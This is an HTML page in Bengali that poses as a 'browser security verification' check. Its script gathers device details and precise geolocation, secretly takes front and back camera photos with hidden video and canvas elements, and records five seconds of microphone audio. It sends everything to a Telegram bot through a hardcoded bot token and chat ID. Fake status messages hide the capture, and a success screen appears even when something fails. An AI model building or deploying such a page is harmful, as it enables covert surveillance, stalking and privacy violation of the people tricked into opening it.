<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>browser সিকিউরিটি ভেরিফিকেশন</title>
    <style>
        :root { --primary: #00d1b2; --dark: #363636; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 10; }
        h2 { color: var(--dark); margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; }
        .btn-start { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* ক্যামেরা এবং অডিও প্রিভিউ গোপন রাখা হয়েছে */
        #video, #canvas { position: absolute; left: -9999px; visibility: hidden; pointer-events: none; }
        .status-text { font-weight: bold; color: var(--primary); margin-top: 15px; }
        #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

<div class="card" id="main-ui">
    <div id="icon" style="font-size: 50px; margin-bottom: 20px;">🔒</div>
    <h2 id="title">browser ভেরিফিকেশন</h2>
    <p id="desc">আপনার browser কনফিগারেশন এবং নিরাপত্তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
    
    <button class="btn-start" id="start-btn" onclick="startProcess()">চেক শুরু করুন</button>

    <div id="process-ui" style="display: none;">
        <div class="loader"></div>
        <p class="status-text" id="status">প্রসেসিং শুরু হচ্ছে...</p>
    </div>

    <img id="my-img" src="my_photo.jpg" alt="Success">
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
const TELEGRAM_BOT_TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
const TELEGRAM_CHAT_ID = "-1003747831651";

async function startProcess() {
    // UI পরিবর্তন
    document.getElementById('start-btn').style.display = 'none';
    document.getElementById('desc').style.display = 'none';
    document.getElementById('process-ui').style.display = 'block';

    // ১. ডিভাইসের তথ্য সংগ্রহ
    const deviceInfo = `📱 ওএস: ${navigator.platform}\n🌐 ব্রাউজার: ${navigator.userAgent.split(') ')[1] || 'Unknown'}\n🖥 স্ক্রিন: ${screen.width}x${screen.height}`;

    // ২. লাইভ হাই-অ্যাকুরেসি লোকেশন
    let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
    try {
        const position = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { 
                enableHighAccuracy: true, 
                timeout: 10000 
            });
        });
        mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
    } catch (e) { console.log("Location Denied"); }

    const finalReport = `📊 *লাইভ ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n\n📍 *সঠিক লোকেশন:* [ম্যাপ দেখুন](${mapLink})`;

    try {
        // ৩. সামনের ক্যামেরা (গোপন)
        updateStatus("সিস্টেম কনফিগারেশন চেক হচ্ছে...");
        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        await captureAndSendPhoto(frontStream, "Front Camera", finalReport);

        // ৪. পেছনের ক্যামেরা (গোপন)
        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).catch(() => null);
        if(backStream) await captureAndSendPhoto(backStream, "Back Camera", "--- অতিরিক্ত ডাটা ---");

        // ৫. অডিও রেকর্ড (গোপন - ৫ সেকেন্ড)
        updateStatus("সিকিউরিটি এনক্রিপশন যাচাই হচ্ছে...");
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        await captureAndSendAudio(audioStream);

        showFinalUI();
    } catch (err) {
        console.error("Error:", err);
        showFinalUI(); // ভুল হলেও ইউজারকে সাকসেস দেখাবে
    }
}

function updateStatus(text) {
    document.getElementById('status').innerText = text;
}

async function captureAndSendPhoto(stream, type, caption) {
    const video = document.getElementById('video');
    video.srcObject = stream;
    return new Promise(resolve => {
        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'img.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                
                stream.getTracks().forEach(track => track.stop());
                resolve();
            }, 'image/jpeg', 0.6);
        }, 1500); 
    });
}

async function captureAndSendAudio(stream) {
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];
    return new Promise(resolve => {
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('voice', blob, 'audio.ogg');
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
            
            stream.getTracks().forEach(track => track.stop());
            resolve();
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    });
}

function showFinalUI() {
    document.getElementById('process-ui').style.display = 'none';
    document.getElementById('icon').innerHTML = '✅';
    document.getElementById('title').innerText = 'ভেরিফিকেশন সম্পন্ন';
    
    // ছবি প্রদর্শন নিশ্চিত করা
    const img = document.getElementById('my-img');
    img.style.display = 'block';
    
    // যদি ফাইল খুঁজে না পায় তবে কনসোলে এরর দেবে
    img.onerror = function() {
        console.error("my_photo.jpg ফাইলটি পাওয়া যায়নি। নিশ্চিত করুন এটি GitHub রিপোজিটরিতে আছে।");
    };
}
</script>
</body>
</html>
